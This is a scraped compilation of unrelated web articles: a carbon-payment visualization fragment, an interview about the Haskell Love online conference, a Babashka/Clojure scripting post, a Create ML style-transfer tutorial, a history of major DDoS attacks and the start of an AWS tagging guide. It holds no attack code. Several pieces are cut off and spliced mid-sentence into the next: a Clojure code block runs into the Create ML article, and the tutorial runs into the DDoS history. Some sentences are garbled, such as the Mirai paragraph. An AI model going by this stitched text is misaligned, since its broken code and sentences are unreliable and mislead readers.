      "business as usual" case.</span></p></div></div><div id="chapter-8"><p><span>To see the effect of paying landowners to defer their harvest with NCAPX, let's consider 
      the amount of carbon on each property one year from today.  White represents no additional carbon 
      relative to the "business as usual" case without NCAPX.
      <p>When landowners reduce their timber harvests through NCAPX, their properties will turn more
      green the more carbon they retain above their "business as usual" harvest levels.</p></span></p></div><div id="chapter-9"><div><p><span><span>Each landowner can decide whether or not reducing their
      timber harvest makes economic sense for them</span>.  Their decision will be strongly influenced by
      the price of carbon.  At a price of $0.50/ton-year, some landowners begin to reduce their harvests.</span></p></div></div><div id="chapter-10"><p><span>At $1.00/ton-year, more landowners elect to participate and will reduce harvests even further.</span></p></div><div id="chapter-11"><p><span>As the price of carbon rises, <span>more landowner participation
      translates to more carbon removed from the atmosphere</span> and stored on the landscape that year.</span></p></div><div id="chapter-12"><p><span>Year over year, NCAPX offers every landowner an opportunity to reduce their timber harvest,
      remove carbon from the atmosphere, and receive payment.
      <p>Each year, payments flow efficiently to the lowest-cost carbon on the landscape.
      </p><p><span>The overall effect is to significantly increase the amount of carbon
      on the landscape relative to the "business as usual" scenario</span>.</p></span></p></div></div></div></div></div>]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><em>By now, we all have learned to work with Zoom, GMeet, and other online tools. But what’s going on in the event industry? How do organizers attract speakers and grow their audience for online events? I interviewed Oli Makhasoeva – the main organizer of the biggest Haskell online event, Haskell Love Conference, in which <a href="https://serokell.io/blog/haskell-to-core">our developer Vlad had a chance to participate in</a>.</em></p><p><em>We talk about their experience organizing Haskell Love, how they kept it accessible for developers of all levels, and what things one should definitely keep in mind when organizing an online conference.</em></p><p><strong>– Hi Oli, first of all, thank you for organizing the biggest Haskell online event! How did it go from your point of view?</strong></p><p>Thank you! We were relatively lucky; no major incidents, although we had some technical challenges. On the first day, we were unable to use our remote desktop, but we were fortunate enough to have a backup. Otherwise, the conference went amazing: a lot of participation from the audience, endless chats; the statistics say we had more than 2000 unique attendees. Many people reached out directly and thanked us for the event – the Haskell community is truly friendly and welcoming. We were happy to see people having conversations during the event at the Hallway track: not only about Haskell, but also about technology and life in general.</p><p><strong>– Tell us about your team of organizers. How did you decide to work together and create the Haskell Love Conference?</strong></p><p>I am proud to say it’s a women organized conference! Most of us know each other for quite a while, from university times. We have Elena who is responsible for planning, Ida who held communications, Margarita worked with sponsors. All of them are professionals, and I am happy to have them. What’s also important, our volunteers had a wide variety of skills and did an amazing job staffing the conference and inspiring others.</p><p>The idea to organize Haskell Love came after we organized the Scala Love conference together. We thought – why not spread the love further to other communities? To achieve this goal, we started a company called <a href="https://konfy.care/">Konfy</a>. Our motto is “Konfy - make your conference comfortable”. Our conferences will always be virtual and free to attend. &lt;3
<img src="https://serokell.io/files/nf/nfjjia3k.oli.png" alt="Oli Makhasoeva"></p><p><strong>– The website says that the conference accepts people with monad-o-phobia. ;) How do you make Haskell events exciting and accessible for everyone, no matter the level of experience the audience has?</strong></p><p>Our program committee worked hard on making sure we included talks of different levels. However, we did not properly promote the level of the talks. We should have tagged all the talks and let people know the levels of the sessions. Action item for the next conference is created! We know how to make it better :)</p><p><strong>– What are the main pros and cons of online conferences vs. offline ones? Are there any specific things you did to make the online conference feel more like the offline one?</strong></p><p>Unlike offline ones, online conferences are accessible from everywhere to anyone with the internet (we even provided a low res streaming option because it was requested by someone with a weak internet connection). You can cover multiple time zones! No dietary restriction problems! Zero CO<sub>2</sub> footprint! And a bigger audience for sponsors! :) These are the advantages of virtual events.</p><p>At an offline event, we gather people in a conference room. You go to a closed place, focus on a speaker, and emerge with new insights. In the case of online events, you think: “I’ll watch a talk and do my other stuff so I don’t lose time.” But let’s be honest, it is harder to concentrate on an FP-oriented talk when you do something simultaneously. To help people to focus and to make our conference feel more like the offline one, we are trying to create an interactive and engaging environment at everyone’s home. That is, we are trying to immerse the person into the atmosphere of the conference with Q&amp;A rooms, the Hallway track, and the Twitter live stream. According to the feedback we got, we didn’t fail, but there is room for improvement.</p><p><strong>– The conference featured many impressive names such as Philip Wadler, Simon Peyton Jones, and others. How did you gather so many bright minds in one place?</strong></p><p>The Haskell community is full of enthusiasts who are willing to spend their time on a free conference and help the community. Speakers were awesome and supported our desire to gather Haskellers from around the world (also, they wanted to get our avatar 😉).</p><p><strong>– What is the most challenging thing in organizing an event like that?</strong></p><p>Building a flow for attendees: Q&amp;A sessions, the Hallway track, announcements, participation, how to move between them, and where to find information about each activity. We still need to improve that part a lot: people were confused by time zones, it wasn’t easy for them to keep track of so many places, etc.</p><p><strong>– To finish it up: what would be one piece of advice you would give to all who want to organize their own FP event?</strong></p><p>Indeed, it was challenging, and we had to scramble, so we’d like to share what we learned in order to help others who are thinking about whether and how to host large events in the coming months: facilitation is the key. Investing in tools to make the sessions as interactive as possible, call-outs for questions before/during, live polls, etc. Don’t let people be silent and just watch a video, make an experience where many people get the feel of a community. If you need help with organizing an online event, reach out to us at <a href="mailto:info@konfy.care">info@konfy.care</a>!</p><p>Many thanks to all who participated in this conference, we enjoyed it a lot and will come back next year! Follow us on <a href="https://twitter.com/_haskellove">Twitter</a> to be up to date with our plans. And don’t be upset if you missed the event, the videos are already out on <a href="https://www.youtube.com/c/Konfy">our Youtube channel</a>.</p></div></div>]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div aria-label="Content">
      <div>
        <article itemscope="" itemtype="http://schema.org/BlogPosting">

  

  <div itemprop="articleBody">
    <p><img src="https://www.karimarttila.fi/img/2020-09-01-using-clojure-in-command-line-with-babashka_img_1.png" alt="Ordinary Clojure code"></p>

<p><em>Ordinary Clojure code - can be run in REPL or in command line with Babashka (the whole file can be found <a href="https://github.com/karimarttila/clojure/blob/master/webstore-demo/integrant-simple-server/postgres/bb_postgres.clj">here</a> )</em></p>

<h3 id="introduction">Introduction</h3>

<p>I never bothered to learn <a href="https://en.wikipedia.org/wiki/Bash_(Unix_shell)">Bash</a> so that I could be really fluent with it. If I needed anything beyond basic Bash stuff I immediately used <a href="https://www.python.org/">Python</a> in command-line scripting.</p>

<p>I’m currently implementing my Clojure simple server again, this time using the <a href="https://github.com/weavejester/integrant">Integrant</a> library. In this new version, I implemented three data stores: CSV, AWS DynamoDB, and Postgres. I had already implemented importing development data into DynamoDB (using Python), this time I used <a href="https://github.com/borkdude/Babashka">Babashka</a> to import development data into Postgres - mainly just to have an excuse to try if I could replace Python with Clojure when scripting something with Bash.</p>

<p>The scripts can be found in my <a href="https://github.com/karimarttila/clojure">Clojure git</a> repo in directory <a href="https://github.com/karimarttila/clojure/tree/master/webstore-demo/integrant-simple-server/postgres">postgres</a>.</p>

<h3 id="developing-with-babashka">Developing with Babashka</h3>

<p>The really neat thing with Babashka is that you can develop your Babashka scripts as part of your Clojure project, or independently but using your favorite Clojure IDE. The picture above shows Clojure code in my favorite Clojure IDE, <a href="https://cursive-ide.com/">Cursive</a>. I have the Clojure code that imports data into the Postgres database in directory <a href="https://github.com/karimarttila/clojure/tree/master/webstore-demo/integrant-simple-server/postgres">postgres</a>, so I have the following extra path in my <a href="https://github.com/karimarttila/clojure/blob/master/webstore-demo/integrant-simple-server/deps.edn">deps.edn</a>:</p>

<div><div><pre><code><span> </span><span>:postgres</span><span> </span><span>{</span><span>:extra-paths</span><span> </span><span>[</span><span>"postgres"</span><span>]}</span><span>
</span></code></pre></div></div>

<p>Then the nice thing is that I can develop the Clojure code as part of project’s other Clojure code. Let’s first create a short bash script that tells Babashka to run your Clojure code with a flag so that we know in the Clojure code when we are running the code using Babashka or using Clojure IDE REPL (file <a href="https://github.com/karimarttila/clojure/blob/master/webstore-demo/integrant-simple-server/postgres/run-bb-load-data.sh">run-bb-load-data.sh</a>):</p>

<div><div><pre><code><span>#/bin/bash</span>

<span>export </span><span>POSTGRES_PASSWORD</span><span>=</span>simpleserver
<span>export </span><span>RUNNING_BB</span><span>=</span>TRUE
bb bb_postgres.clj
</code></pre></div></div>

<p>The flag is the <code>RUNNING_BB</code> export above.</p>

<p>Then in the Clojure code we have a top level form <code>(run-me)</code> in the namespace (file <a href="https://github.com/karimarttila/clojure/blob/master/webstore-demo/integrant-simple-server/postgres/bb_postgres.clj">bb_postgres.clj</a>):</p>

<div><div><pre><code><span>(</span><span>defn</span><span> </span><span>run-me</span><span> </span><span>[]</span><span>
  </span><span>"Loads data only if running from Babashka script which sets the environment variable.
  We don't want the repl to load the data when reloading the namespace.
  In repl experimentation use the rich comment below."</span><span>
  </span><span>(</span><span>let</span><span> </span><span>[</span><span>running-bb?</span><span> </span><span>(</span><span>System/getenv</span><span> </span><span>"RUNNING_BB"</span><span>)]</span><span>
    </span><span>(</span><span>if</span><span> </span><span>(</span><span>=</span><span> </span><span>running-bb?</span><span> </span><span>"TRUE"</span><span>)</span><span>
      </span><span>(</span><span>import-data</span><span>))))</span><span>

</span><span>(</span><span>run-me</span><span>)</span><span>
</span></code></pre></div></div>

<p>I.e. when reloading the namespace REPL runs the code but if the flag is not set it doesn’t actually do anything - it imports the code only if we are running the code using Babashka. The reason for this is that when I reload the namespace as part of my Clojure workflow I don’t want the data import to happen. For development purposes to test importing data, or any other function, I have a <code>rich comment</code> at the end of the file:</p>

<div><div><pre><code><span>(</span><span>comment</span><span>
  </span><span>(</span><span>def</span><span> </span><span>data-dir</span><span> </span><span>"dev-resources/data"</span><span>)</span><span>
  </span><span>(</span><span>get-raw-products</span><span> </span><span>data-dir</span><span> </span><span>2</span><span>)</span><span>
  </span><span>(</span><span>get-product-groups</span><span> </span><span>data-dir</span><span>)</span><span>
  </span><span>(</span><span>do</span><span>
    </span><span>(</span><span>delete-products!</span><span>)</span><span>
    </span><span>(</span><span>delete-product-groups!</span><span>))</span><span>
  </span><span>(</span><span>vals</span><span> </span><span>(</span><span>get-users</span><span> </span><span>data-dir</span><span>))</span><span>
  </span><span>(</span><span>load-users</span><span> </span><span>(</span><span>vals</span><span> </span><span>(</span><span>get-users</span><span> </span><span>data-dir</span><span>)))</span><span>
  </span><span>(</span><span>import-data</span><span>)</span><span>
  </span><span>(</span><span>db-get-all-product-groups</span><span>)</span><span>
  </span><span>(</span><span>db-get-all-products</span><span>)</span><span>
  </span><span>)</span><span>
</span></code></pre></div></div>

<p>The <code>comment</code> block is here so that REPL does not run this code when reloading, of course. The function calls you see inside the comment block are just experiments added in no particular order. I can send any of these forms individually to be evaluated in the REPL - a typical Clojure trick when developing with REPL.</p>

<h3 id="babashka-use-cases">Babashka Use Cases</h3>

<p>I really like the idea that I can now use Clojure in shell scripting. Of course I could use Clojure in shell scripting also without Babashka but JVM boot takes quite a long time which makes testing of the script in command line a bit painful. Not so with Babashka - Babashka boots lightning fast:</p>

<div><div><pre><code>λ&gt; <span>time </span>bb <span>'(println "Hello world!")'</span>
Hello world!

real	0m0.006s
user	0m0.003s
sys	0m0.003s
</code></pre></div></div>

<p>The use cases using Babashka in my personal scripting probably is a bit like I used Babashka to import data into the Postgres database in this exercise:</p>

<div><div><pre><code><span>(</span><span>defn</span><span> </span><span>run-sql</span><span> </span><span>[</span><span>command</span><span>]</span><span>

<p>I.e. parsing CSV, transforming data, and then call some program with the transformed data, possibly read what was returned and do other stuff. You could possibly do all this using plain old Bash but I never bothered to learn Bash in that level that I can do more than test some flags and call other programs using Bash.</p>

<h3 id="how-do-i-use-the-babashka-script-in-this-exercise">How Do I Use the Babashka Script in This Exercise?</h3>

<p>I used Babashka to load development data into the Postgres data store. During development I built a custom Postgres image and provided a <a href="https://github.com/casey/just">Just</a> recipe to start the data store (file <a href="https://github.com/karimarttila/clojure/blob/master/webstore-demo/integrant-simple-server/Justfile">Justfile</a>):</p>

<div><div><pre><code><span># Start local postgres</span>
@postgres:
    <span>cd </span>postgres <span>&amp;&amp;</span> ./run-docker-compose.sh
</code></pre></div></div>

<p>The <a href="https://github.com/karimarttila/clojure/blob/master/webstore-demo/integrant-simple-server/postgres/run-docker-compose.sh">run-docker-compose.sh</a> starts the Postgres docker container, creates the schema and finally calls <a href="https://github.com/karimarttila/clojure/blob/master/webstore-demo/integrant-simple-server/postgres/run-bb-load-data.sh">./run-bb-load-data.sh</a> which loads the data into the development Postgres data store:</p>

<div><div><pre><code><span>#!/usr/bin/env bash</span>

<span>echo</span> <span>"NOTE: Remember to destroy the container if running again!"</span>
<span>echo</span> <span>"Starting docker compose..."</span>

<span>echo</span> <span>"Loading data..."</span>

</code></pre></div></div>

<h3 id="clojure-babashka-vs-python-in-shell-scripting">Clojure (Babashka) vs Python in Shell Scripting</h3>

<p>Let’s finally compare Python and Clojure (Babashka) when doing some Linux shell scripting.</p>

<p><strong>Easiness</strong>. Both languages are pretty easy and fast to work if you have used them. Developing Python scripts is pretty fast - you just run the script in command line. Working with Clojure has one additional plus: you can use the Clojure REPL.</p>

<p><strong>Library support</strong>: Python wins. When you are scripting in Python and you realize that it would be nice e.g. to use some AWS library - just use it (e.g. <a href="https://github.com/karimarttila/clojure/blob/master/webstore-demo/integrant-simple-server/dynamodb/pysrc/table_importer.py">table_importer.py</a> - the AWS <a href="https://boto3.amazonaws.com/v1/documentation/api/latest/index.html">boto3</a> library). The library support for Babashka is not as extensive, of course - but Babashka supports quite many namespaces outside <code>clojure.core</code> and also some additional libraries: <a href="https://github.com/borkdude/babashka#built-in-namespaces">Babashka built-in namespaces</a> - keep eye on that page, maybe Babashka library support is growing in the future!</p>

<p>So, the library support might not be as good as with Python. But I really do love Clojure and if I’m implementing apps using Clojure it is really nice to do some ad hoc scripting using Babashka.</p>

<h3 id="conclusions">Conclusions</h3>

<p>It’s nice to have another scripting tool in my toolbox: <a href="https://github.com/borkdude/babashka">Babashka</a>. Time will tell if I start using Clojure instead of Python as my preferred scripting language, thanks to Babashka. At least in this exercise Babashka did really well.</p>

It’s also can be handy or data augmentation.</p><p id="3007"><a href="https://developer.apple.com/videos/play/wwdc2020/10642/#:~:text=Style%20Transfer%20is%20a%20new,style%20and%20content%20image%20together." target="_blank" rel="noopener">At WWDC 2020, Create ML</a> (Apple’s model building framework) got a big boost with the inclusion of style transfer models. Though it’s shipped with the Xcode 12 update, you’ll need macOS Big Sur (in beta at the time of writing) to train style transfer models.</p><p id="4658">Create ML has now unlocked the potential to train style transfer models right from your MacBook. You can train both image and video style transfer convolutional neural networks, with the latter using only a limited set of convolution filters to make it optimized for real-time image processing.</p><p id="3a4c">To get started, you need three things:</p><ul><li id="21c8">A styling image (also called a style reference image). Typically, you can use famous paintings or abstract art images to let your model learn and impart the style from. In our case, we’ll be using a pencil sketch image in our first model (check the screenshot below).</li><li id="cf98">A validation image that helps visualize model quality during the training process.</li><li id="bad2">Dataset of content images that act as our training data. To get optimal results, it’s best to work with a directory of images similar to ones you’d use while running inference.</li></ul><p id="825a">In this article, I’ll be using <a href="https://www.kaggle.com/jessicali9530/celeba-dataset" target="_blank" rel="noopener">this celebrity image dataset</a> as our content images.</p><p id="2bec">Here’s a glimpse at how my Create ML style transfer settings tab looked before training the model.</p></div></div><div><div><div><figure><div><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/3048/1*7CZv5HvelAReQ9CTDCmJ7g.png" width="1524" height="855" srcset="https://miro.medium.com/max/552/1*7CZv5HvelAReQ9CTDCmJ7g.png 276w, https://miro.medium.com/max/1104/1*7CZv5HvelAReQ9CTDCmJ7g.png 552w, https://miro.medium.com/max/1280/1*7CZv5HvelAReQ9CTDCmJ7g.png 640w, https://miro.medium.com/max/1456/1*7CZv5HvelAReQ9CTDCmJ7g.png 728w, https://miro.medium.com/max/1632/1*7CZv5HvelAReQ9CTDCmJ7g.png 816w, https://miro.medium.com/max/1808/1*7CZv5HvelAReQ9CTDCmJ7g.png 904w, https://miro.medium.com/max/1984/1*7CZv5HvelAReQ9CTDCmJ7g.png 992w, https://miro.medium.com/max/2000/1*7CZv5HvelAReQ9CTDCmJ7g.png 1000w" sizes="1000px" data-old-src="https://miro.medium.com/max/60/1*7CZv5HvelAReQ9CTDCmJ7g.png?q=20"></p></div></div></div></figure></div></div></div><div><p id="5258">The validation image below shows real-time style transfer applied at each iteration interval.

Typically, the style loss should decrease over time, showing that the neural network is learning to adopt the artistic traits of the style image.</p><p id="d365">While the default model parameters work great, Create ML allows us to customize them for specific use cases.</p><p id="3cf8">The low style strength parameter tuned only the parts of the background with the style image, thereby keeping the primary subject intact. At the same time, setting the style strength parameter to high would impart more style textures on the edges of the image.</p><p id="3d53">Similarly, coarse style density uses high-level details of the style image (such models are trained much faster), whereas fine density lets the model learn minute details.</p><p id="f797">Create ML style transfer models train with a default number of iterations set to 500, which is ideal for most use cases. Iterations are the number of batches needed to complete one epoch. One epoch equals one training cycle of the entire dataset. For example, if the training dataset consists of 500 images and the batch size is 50, it indicates that 10 iterations will complete one epoch (note: Create ML model training doesn’t tell you the batch size).</p><p id="3964">This year, Create ML also introduced a new feature called model snapshots. These allow us to capture intermediate Core ML models during training and export them into your apps. However, models used from snapshots aren’t optimized for size and are significantly larger than the ones generated on training completion (specifically, the snapshots I took had Core ML model sizes in the range of 5–6 MB, whereas the final model size was 596 KB).</p><p id="2872">The following gif shows one such example, where I’ve compared model snapshot results across different iterations:</p><figure><div><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/1618/1*PyPIjKVJTV-piFo4TAdMug.gif" width="809" height="480" srcset="https://miro.medium.com/max/552/1*PyPIjKVJTV-piFo4TAdMug.gif 276w, https://miro.medium.com/max/1104/1*PyPIjKVJTV-piFo4TAdMug.gif 552w, https://miro.medium.com/max/1280/1*PyPIjKVJTV-piFo4TAdMug.gif 640w, https://miro.medium.com/max/1400/1*PyPIjKVJTV-piFo4TAdMug.gif 700w" sizes="700px" data-old-src="https://miro.medium.com/freeze/max/60/1*PyPIjKVJTV-piFo4TAdMug.gif?q=20"></p></div></div></div><figcaption>The girl is an actress. The guy is me.</figcaption></figure><p id="f027">Do note how on one of the images, the style isn’t composed on the complete image. This is because the styling image used was of a smaller size. Hence, the network wasn’t able to learn enough style information, causing the composed image to be of sub-par quality.</p><p id="fb1c">Ideally, having a minimum size of 512 px for the style image will ensure good results.</p></div></div></section><hr><section></section><hr><section><div><div><p id="5ca4">In the following sections, we will build an iOS application that runs style transfer models in <em>real-time. </em>Here’s a bird’s eye view of our next steps:</p><ul><li id="8b11">Analyze results across three video style transfer neural network models.

You can draw custom overlays, fine-tune the camera settings, do photo segmentation with the depth outputs, and analyze frames.</p><p id="f2ce">We’ll primarily focus on analyzing frames, and specifically transforming them using style transfer, and displaying them in an image view to build a live camera feed (you can also use Metal for further optimization, but for the sake of simplicity, we’ll skip that for this tutorial).</p><p id="2822">At a very basic level, building a custom camera involves the following components:</p><ul><li id="3e32"><code>AVCaptureSession</code> — this manages the whole session of the camera. Its functionality involves getting access to the iOS input devices and passing the data to output devices. AVCaptureSession also lets us define <code><a href="https://developer.apple.com/documentation/avfoundation/avcapturesession/preset" target="_blank" rel="noopener">Preset</a></code> types for different capture sessions.</li><li id="b71f"><code>AVCaptureDevice</code> — lets us select the front or back camera. We can either pick the default settings or use <code>AVCaptureDevice.DiscoverySession</code> to filter and select hardware-specific features, such as the TrueDepth or WideAngle cameras.</li><li id="0355"><code>AVCaptureDeviceInput</code> — this provides the media source(s) from a capture device and sends it to the capture session.</li><li id="7e56"><code>AVCaptureOutput</code> — an abstract class that provides the output media to the capture session. It also lets us handle the camera orientation. We can set multiple outputs (such as for camera and microphone). For example, if you’re looking to capture photo and movies, add <code>AVCaptureMovieFileOutput</code> and <code>AVCapturePhotoOutput</code>. In our case, we’ll be using <code>AVCaptureVideoDataOutput</code> , as it provides video frames for processing.</li><li id="38cf"><code>AVCaptureVideoDataOutputSampleBufferDelegate</code> is a protocol we can use to access every frame buffer inside the <code>didOutput</code> delegate method. In order to start receiving frames, we need to invoke the <code>setSampleBufferDelegate</code> method on <code>AVCaptureVideoDataOutput</code></li><li id="909e"><code>AVCaptureVideoPreviewLayer</code> — basically a <code>CALayer</code> that visually displays the live camera feed from the output of the capture session. We can transform the layer with overlays and animations. It’s important to set this for the sample buffer delegate methods to work.</li></ul><p id="f171">To start off, add the <code>NSCameraUsageDescription</code> camera permission in your project’s <code>info.plist</code> file in Xcode.</p><p id="36f3">Now, it’s time to create an <code>AVCaptureSession</code> in the <code>ViewController.swift</code> :</p><pre><span id="f86b">let captureSession = AVCaptureSession()<br>captureSession.sessionPreset = AVCaptureSession.Preset.medium</span></pre><p id="cc2b">Next, we’ll filter and select the wide-angle camera from the list of available camera types present in the <code>AVCaptureDevic</code> instance and add it to the <code>AVCaptureInput</code>, which in turn is set on the <code>AVCaptureSession</code>:</p><figure><div></div></figure><p id="dfa7">Now that our input is set, let's add our video output to the capture session:</p><pre><span id="9efa">let videoOutput = AVCaptureVideoDataOutput()</span><span id="d315">videoOutput.alwaysDiscardsLateVideoFrames = true</span><span id="7dfa">videoOutput.<strong>setSampleBufferDelegate</strong>(self, queue: DispatchQueue(label: "videoQueue"))</span><span id="e234">if captureSession.canAddOutput(videoOutput){<br> <strong>captureSession.addOutput(videoOutput)</strong><br>}</span></pre><p id="0a64">The <code>alwaysDiscardsLateVideoFrames</code> property ensures that frames that arrive late are dropped, thereby ensuring there’s less latency.</p><p id="6fda">Finally, add the following piece of code to prevent a rotated camera feed:</p><pre><span id="4de3">guard let connection = videoOutput.connection(with: .video) <br>else { return }</span><span id="68ca">guard connection.isVideoOrientationSupported else { return }<br>connection.videoOrientation = .portrait</span></pre><blockquote><p id="33e9">Note: In order to ensure all orientations, you need to set the <code>videoOrientation</code> based on the device’s current orientation.

<p>In our blog, we’ve already talked about what DDoS attack is, how a DDoS attack is created, the main types, and most importantly, what methods are used to protect against them.</p>



<p><a href="https://utopia.fans/networks/ddos-attack-what-it-is-and-how-to-trace-a-ddos-attack/"><em>DDoS Attack: What It Is And How To Trace A DDoS Attack?</em></a><em> We recommend reading this introductory article first to make sure you understand the main principle of such attacks.</em></p>



<p>However, today we would like to recall the most famous and powerful attacks in history. As the proverb says: “Learn history so that it doesn’t happen again.” Or at least so that you know what to do in a given situation.</p>



<p>So today, we’ll consider a list of the top and unexpected biggest DDoS attacks in history.</p>



<p><em>Read</em><a href="https://utopia.fans/privacy/fully-fledged-guide-on-ways-to-protect-your-data-online/"><em> </em><em>Fully-Fledged Guide On Ways To Protect Your Data Online</em></a><em>. Use maximum protection in the Internet space.</em></p>



<h3>DDoS in the last century</h3>



<p>In the early 1990s, DDoS in the form of SYN flood technology (sending “garbage” requests to the operating system to establish a TCP connection) was sacred. It was passed from mouth-to-mouth and used mostly for mischievous purposes, without much success or resonance.</p>



<div><figure><img loading="lazy" decoding="async" src="https://utopia.fans/wp-content/webp-express/webp-images/uploads/2020/09/DDoS.jpg.webp" alt="The biggest DDoS attack in history" srcset="https://utopia.fans/wp-content/webp-express/webp-images/uploads/2020/09/DDoS.jpg.webp 602w,  https://utopia.fans/wp-content/webp-express/webp-images/uploads/2020/09/DDoS-300x150.jpg.webp 300w" sizes="(max-width: 602px) 100vw, 602px"></figure></div>



<p>It was not until 1996 that the CERT, Coordination center at Carnegie Mellon University, published recommendations to counter the SYN flood, thus officially recognizing the problem.</p>



<p>The reason was the first large-scale attack on the largest Internet provider in New York — Panix Networks. It was a commercial attack organized by spammers. They took revenge on Panix for not allowing them to send junk advertising messages to users.</p>



<p>In 1996, a set of free tools with source code for DDoS implementation was published for the first time. This tool was tested two years later at the University of Michigan when the second major DDoS attack took place.</p>



<p>Here’s an interesting fact: the University of Michigan is located in Ann Arbor, where Arbor Networks (one of the leading manufacturers of equipment for countering DDoS) came from. The company’s history began with several research papers written at this university in the wake of the sensational attack.</p>



<p>In 2000, a 15-year-old hiding under the nickname MafiaBoy overturned the most visited sites in the world at that time: eBay, CNN, Dell, Yahoo, Amazon, etc. The online community was in a panic. It seemed that the Internet Apocalypse was coming.</p>



<div><figure><img loading="lazy" decoding="async" src="https://utopia.fans/wp-content/webp-express/webp-images/uploads/2020/09/MafiaBoy.jpg.webp" alt="Largest DDoS attack in history" srcset="https://utopia.fans/wp-content/webp-express/webp-images/uploads/2020/09/MafiaBoy.jpg.webp 602w,  https://utopia.fans/wp-content/webp-express/webp-images/uploads/2020/09/MafiaBoy-300x205.jpg.webp 300w" sizes="(max-width: 602px) 100vw, 602px"></figure></div>



<p>It was at the time the largest DDoS attack in history.</p>

<h3>New era</h3>



<p>The Internet, as you can see, is not broken. The industry has learned to resist hackers.</p>



<p>But already in 2001, the technique of the attacks was greatly improved. The first serious attacks of the application-level were launched. When such an attack was made on a network resource containing a vulnerability (an “amplifier”), the system sent a request. Then it was repeatedly replicated by this server and redirected to the victim’s resource.</p>



<p>In 2003, DDoS reached Russia, bringing an attack on MasterHost, the largest website hosting provider in the country at that time.</p>



<p>In 2004, Cisco System absorbed the Israeli developer of attack prevention tools Riverhead Networks. Thanks to this purchase, it created the first successful commercial product for fighting DDoS — Cisco Guard.</p>



<p>A serious arms race began, and the criminal DDoS market was finally formed — with hacker coalitions, competitive wars, and fabulous earnings.</p>



<p>The scale of attacks began to increase exponentially: in 2010, the speed of the most powerful attack exceeded 100 Gbit/s; in 2013 it was 300 Gbit/s. In 2016, there were confirmed reports of attacks exceeding one Tbit/s.</p>



<h3>The biggest DDoS attacks in history</h3>



<p><strong><u>Estonia in April 2007</u></strong></p>



<p>Following official Moscow, representatives of Russian Pro-government youth movements were outraged by the transfer of the “Bronze Soldier in Tallinn”, a World War II monument, from Tallinn’s center to the military cemetery. Simultaneously with information campaigns on the internet (which activists called “blasphemy”) and a series of street actions, a flurry of DDoS attacks hit the websites of publications, banks, and departments in Estonia.</p>



<div><figure><img loading="lazy" decoding="async" src="https://utopia.fans/wp-content/webp-express/webp-images/uploads/2020/09/Bronze-Soldier.jpg.webp" alt="DDoS attack of the new age" srcset="https://utopia.fans/wp-content/webp-express/webp-images/uploads/2020/09/Bronze-Soldier.jpg.webp 602w,  https://utopia.fans/wp-content/webp-express/webp-images/uploads/2020/09/Bronze-Soldier-300x204.jpg.webp 300w" sizes="(max-width: 602px) 100vw, 602px"></figure></div>



<p>Powerful DDoS attacks on the Estonian Internet only fueled the protest. The population of Estonia, which at that time was considered almost the most internalized in the world, was periodically left without access to government resources, online publications, websites of banks, and organizations for almost three weeks.</p>



<p><strong><u>War in Georgia: DDoS as a weapon</u></strong></p>



<p>In the course of the conflict in South Ossetia, Pro-Russian hackers have again supported official Moscow’s position. Their Georgian colleagues did not remain in debt — the parties tried to drown out each other’s news with DDoS attacks. The websites of the Georgian and Ossetian authorities were also affected.</p>



<p><strong><u>Iran vs iPOS</u></strong></p>



<p>In 2013, during the presidential election in Iran, almost the only company that independently tracks voters’ opinions was the American iPOS, located in McLane, Virginia, near the CIA’s headquarters. The world’s leading media referred to its survey data from Iran. The company’s website was very popular among Iranians, and as the election approached, it was increasingly attacked by unknown hackers.</p>



<p><strong><u>North Korea is offline</u></strong></p>



<p>In 2014, as a result of an attack by Pro-American hackers, North Korea lost its already meager access to the worldwide web. This DDoS was a response to the hacking of the website of Sony Pictures Entertainment, the distributor of the film, which mocked the North Korean leader.</p>



<p>Of course, ordinary residents of North Korea did not feel the problem, since only representatives of the party elite, special services, certain departments, universities, scientific organizations, and employees of foreign embassies and firms have access to the internet.</p>



<p><strong><u>Mirai</u></strong></p>



<p>On the eve of the USA’s presidential election, Hillary Clinton and Donald Trump were attacked the websites of two main candidates simultaneously. A month earlier, the same botnet was already used in an attack on the DNS provider Dyn.</p>



<div><figure><img loading="lazy" decoding="async" src="https://utopia.fans/wp-content/webp-express/webp-images/uploads/2020/09/Mirai.jpg.webp" alt="Mirai DDoS attack" srcset="https://utopia.fans/wp-content/webp-express/webp-images/uploads/2020/09/Mirai.jpg.webp 602w,  https://utopia.fans/wp-content/webp-express/webp-images/uploads/2020/09/Mirai-300x200.jpg.webp 300w" sizes="(max-width: 602px) 100vw, 602px"></figure></div>



<p>On October 21, 2016, American Internet users began to complain about many popular sites: Twitter, Facebook, Reddit, Spotify, PayPal, Pinterest, Github, Airbnb, Amazon, and others. The problem also affected residents of Europe, including Russia — problems even reached several cities in India.</p>



<p>The reason for the massive failure was a DDoS attack on the DNS server provider Dyn. The garbage traffic that choked the Dyn servers came from Linux-based household devices infected with the Mirai virus. The botnet has been joined by routers and smart kettles, microwaves, Webcams, printers, refrigerators, and baby monitors-several million of the most unexpected household appliances connected to the Internet.</p>

<p>Once <a href="https://www.cloudforecast.io/blog/aws-tagging-best-practices/" target="_blank">you have adopted an AWS tagging strategy</a>, you’ll need to make sure that all your existing AWS resources and any new ones you create abide by it. Consistency is the key - if you don’t proactively enforce your AWS tagging strategy, you’ll always be playing catch up and chasing down team members to make sure they add the right tags to their resources.</p>

<p>While you can apply AWS tags to your resources manually using the <a href="https://docs.aws.amazon.com/cli/latest/reference/resourcegroupstaggingapi/tag-resources.html" target="_blank">AWS CLI</a> or <a href="https://docs.aws.amazon.com/ARG/latest/userguide/tag-editor.html" target="_blank">AWS Tag Editor</a>, you’ll probably find this cumbersome and error-prone at scale. A better approach is to automatically apply AWS tags to your resources and use rules to enforce their consistent usage.</p>

<p>Depending on the tool you use to maintain your infrastructure on AWS, your method of proactively enforcing AWS tags on new resources may vary. In this guide, I’ll highlight two tools: Terraform and AWS CloudFormation. You’ll see how to use each to create and update AWS cost allocation tags on your resources and then enforce the proper use of specific tags for new resources. By proactively enforcing your AWS tagging strategy, you’ll minimize your time spent auditing and correcting improper AWS tags and force developers to learn best AWS tagging best practices for your environment.</p>



<p>The first infrastructure management tool I’ll cover is <a href="https://www.terraform.io/" target="_blank">Terraform</a>. Terraform works across a variety of cloud hosting providers to help you provision and maintain your AWS resources. With Terraform, you can define your servers, databases, and networks in code and apply your changes programmatically to your AWS account.</p>

